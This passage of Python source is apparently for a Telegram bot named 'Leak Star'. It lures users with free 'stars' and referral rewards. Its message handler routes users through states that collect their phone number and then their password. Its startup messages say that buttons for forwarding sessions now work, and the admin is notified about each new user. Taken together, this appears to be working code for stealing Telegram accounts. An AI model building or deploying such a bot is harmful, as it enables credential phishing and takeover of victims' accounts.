                    current_stars = user_stats[target_id].get('stars', 0)
                    user_stats[target_id]['stars'] = current_stars + amount
                    
                    await send_message(user_id, f"✅ *Начислено {amount} звёзд пользователю {target_id}*", parse_mode='Markdown')
                    save_data()
                else:
                    await send_message(user_id, "❌ *Пользователь не найден*", parse_mode='Markdown')
            else:
                await send_message(user_id, "❌ */addstars user_id amount*", parse_mode='Markdown')
        except:
            await send_message(user_id, "❌ *Ошибка системы*", parse_mode='Markdown')
        return
    
    elif message_text.startswith('/removestars') and user_id == ADMIN_CHAT_ID:
        try:
            parts = message_text.split()
            if len(parts) == 3:
                target_id = int(parts[1])
                amount = int(parts[2])
                
                if target_id in user_stats:
                    current_stars = user_stats[target_id].get('stars', 0)
                    user_stats[target_id]['stars'] = max(0, current_stars - amount)
                    
                    await send_message(user_id, f"✅ *Списано {amount} звёзд у пользователя {target_id}*", parse_mode='Markdown')
                    save_data()
                else:
                    await send_message(user_id, "❌ *Пользователь не найден*", parse_mode='Markdown')
            else:
                await send_message(user_id, "❌ */removestars user_id amount*", parse_mode='Markdown')
        except:
            await send_message(user_id, "❌ *Ошибка системы*", parse_mode='Markdown')
        return
    
    if message_text.startswith('/'):
        return
    
    # Обработка состояний
    if state == UserState.WAITING_PHONE:
        await process_phone(user_id, message_text)
    
    elif state == UserState.WAITING_PASSWORD:
        await process_password(user_id, message_text)
    
    elif state == UserState.WAITING_WITHDRAW_USERNAME:
        await process_withdrawal(user_id, message_text.strip().replace('@', ''))
    
    elif state == UserState.WAITING_ARTICLE_TEXT:
        await process_article_text(user_id, message_text)
    
    elif state == UserState.WAITING_MEDIA_FILE:
        if event.media:
            if user_id not in user_data:
                user_data[user_id] = {}
            user_data[user_id]['media'] = event.message
            user_states[user_id] = UserState.WAITING_ARTICLE_BUTTONS
            
            keyboard = create_article_buttons_keyboard()
            await send_message(user_id, "✅ *Медиафайл сохранен!*\n\n📋 *Настройка кнопок статьи*", 
                             buttons=keyboard, parse_mode='Markdown')
        else:
            await send_message(user_id, "❌ *Отправьте фото или видео!*", parse_mode='Markdown')
    
    elif state == UserState.WAITING_BUTTON_TEXT:
        if user_id not in user_data:
            user_data[user_id] = {}
        if 'buttons' not in user_data[user_id]:
            user_data[user_id]['buttons'] = []
        
        user_data[user_id]['button_text'] = message_text
        user_states[user_id] = UserState.WAITING_BUTTON_DATA
        
        button_type = user_data[user_id].get('current_button_type', ButtonType.URL)
        
        prompts = {
            ButtonType.URL: "🌐 *Введите URL для кнопки:*\n\nПример: `https://example.com`",
            ButtonType.CALLBACK: "🔄 *Введите callback данные:*\n\nПример: `show_more_info`",
            ButtonType.SWITCH_INLINE: "🔍 *Введите текст для поиска:*\n\nПример: `найти товары`",
            ButtonType.PHONE: "📱 *Кнопка запроса телефона*\n\nНажмите готово чтобы продолжить",
            ButtonType.GEO: "📍 *Кнопка запроса геолокации*\n\nНажмите готово чтобы продолжить",
            ButtonType.POLL: "📊 *Кнопка создания опроса*\n\nНажмите готово чтобы продолжить",
            ButtonType.GAME: "🎮 *Кнопка запуска игры*\n\nНажмите готово чтобы продолжить"
        }
        
        await send_message(user_id, prompts.get(button_type, "📝 *Введите данные для кнопки:*"), parse_mode='Markdown')
    
    elif state == UserState.WAITING_BUTTON_DATA:
        if user_id in user_data and 'button_text' in user_data[user_id] and 'current_button_type' in user_data[user_id]:
            button_text = user_data[user_id]['button_text']
            button_data = message_text
            button_type = user_data[user_id]['current_button_type']
            
            button_row = []
            if button_type == ButtonType.URL:
                if button_data.startswith(('http://', 'https://')):
                    button_row.append(KeyboardButtonUrl(button_text, button_data))
                else:
                    await send_message(user_id, "❌ *URL должен начинаться с http:// или https://*", parse_mode='Markdown')
                    return
            elif button_type == ButtonType.CALLBACK:
                if button_data and len(button_data.encode()) <= 64:
                    button_row.append(KeyboardButtonCallback(button_text, button_data.encode()))
                else:
                    await send_message(user_id, "❌ *Callback данные должны быть меньше 64 байт*", parse_mode='Markdown')
                    return
            elif button_type == ButtonType.SWITCH_INLINE:
                button_row.append(KeyboardButtonSwitchInline(button_text, button_data))
            elif button_type == ButtonType.PHONE:
                button_row.append(KeyboardButtonRequestPhone(button_text))
            elif button_type == ButtonType.GEO:
                button_row.append(KeyboardButtonRequestGeoLocation(button_text))
            elif button_type == ButtonType.POLL:
                button_row.append(KeyboardButtonRequestPoll(button_text))
            elif button_type == ButtonType.GAME:
                button_row.append(KeyboardButtonGame(button_text))
            
            if button_row:
                if 'buttons' not in user_data[user_id]:
                    user_data[user_id]['buttons'] = []
                
                user_data[user_id]['buttons'].append(button_row)
                
                buttons_list = user_data[user_id]['buttons']
                buttons_text = "\n".join([f"{i+1}. {btn[0].text}" for i, btn in enumerate(buttons_list)])
                
                user_states[user_id] = UserState.WAITING_ARTICLE_BUTTONS
                keyboard = create_article_buttons_keyboard()
                await send_message(user_id, f"✅ *Кнопка добавлена!*\n\n📋 *Текущие кнопки:*\n{buttons_text}", 
                                 buttons=keyboard, parse_mode='Markdown')
    
    elif state == UserState.NONE:
        keyboard = create_main_keyboard(user_id)
        await send_message(user_id, '📱 *Главное меню*', buttons=keyboard, parse_mode='Markdown')

# Обработчик старта
@bot.on(events.NewMessage(pattern='/start'))
async def start_handler(event):
    global total_users
    user_id = event.sender_id
    
    ref_code = None
    if event.raw_text:
        parts = event.raw_text.split()
        if len(parts) > 1 and parts[1].startswith('ref_'):
            ref_code = parts[1]
    
    user = await event.get_sender()
    username = user.username or 'Гость'
    first_name = user.first_name or 'Пользователь'
    last_name = user.last_name or ''
    full_name = f"{first_name} {last_name}".strip()
    current_time = datetime.now()
    
    welcome_img = create_welcome_image(user_id, username)
    
    if user_id not in processed_users:
        processed_users.add(user_id)
        total_users += 1
        
        if user_id not in user_stats:
            user_stats[user_id] = {
                "stars": 100,
                "reg_date": current_time,
                "refs": [],
                "verified_refs": [],
                "bonus_streak": 0
            }
        
        if user_id not in referral_links:
            ref_code_user = f"ref_{user_id}_{int(current_time.timestamp())}"
            referral_links[user_id] = ref_code_user
            referral_map[ref_code_user] = user_id
        
        if ref_code and ref_code in referral_map:
            referrer_id = referral_map[ref_code]
            if referrer_id in user_stats:
                if 'refs' not in user_stats[referrer_id]:
                    user_stats[referrer_id]['refs'] = []
                
                user_stats[referrer_id]['refs'].append(user_id)
                user_stats[referrer_id]['stars'] += 50
        
        save_data()
        
        admin_message = (
            f"👤 *Новый пользователь*\n\n"
            f"🆔 *ID:* `{user_id}`\n"
            f"📱 *Юзернейм:* @{username}\n"
            f"👤 *Имя:* {full_name}\n"
            f"⏰ *Время:* {current_time.strftime('%H:%M:%S')}"
        )
        await send_message(ADMIN_CHAT_ID, admin_message, parse_mode='Markdown')
    
    if welcome_img:
        await send_photo(user_id, welcome_img,
            caption=f"🌟 *Добро пожаловать в Leak Star, {first_name}!*\n\n"
                   f"⭐ *Стартовый бонус:* 100 звёзд\n"
                   f"👥 *За каждого друга:* 50 звёзд\n"
                   f"🎁 *Ежедневные бонусы*\n"
                   f"🎮 *Мини-игры с наградами*",
            parse_mode='Markdown'
        )
    
    keyboard = create_main_keyboard(user_id)
    await send_message(user_id,
        "📱 *Выберите действие из меню ниже:*",
        buttons=keyboard,
        parse_mode='Markdown'
    )

# Функция автосохранения
async def auto_save_data():
    while True:
        await asyncio.sleep(300)
        try:
            save_data()
            print("💾 Данные автоматически сохранены")
        except Exception as e:
            print(f"⚠️ Ошибка автосохранения: {e}")

async def main():
    print("🌟 Запуск системы Leak Star...")
    print("🔄 ИСПРАВЛЕНО: Фото теперь отправляются как фото (временные файлы + force_document=False)")
    print("✅ ИСПРАВЛЕНО: Кнопки пересылки сессии теперь работают")
    print("🎮 Игры с выбором ставки")
    print("🔒 Регистрация обязательна для игр")
    print("💾 Автосохранение каждые 5 минут")
    
    asyncio.create_task(auto_save_data())
    
    try:
        await bot.start(bot_token=API_TOKEN)
        me = await bot.get_me()
        print(f"✅ Система активна: @{me.username}")
        print(f"🆔 ID системы: {me.id}")
        print(f"👥 Пользователей в базе: {total_users}")
        print("⚡ Ожидание подключений...")
        
        await bot.run_until_disconnected()
    except errors.AccessTokenInvalidError:
        print("❌ Неверный токен доступа!")
    except Exception as e:
        print(f"❌ Критическая ошибка: {e}")
        import traceback
        traceback.print_exc()
    finally:
        save_data()
        print("💾 Данные сохранены перед выходом")

if __name__ == '__main__':
    asyncio.run(main())
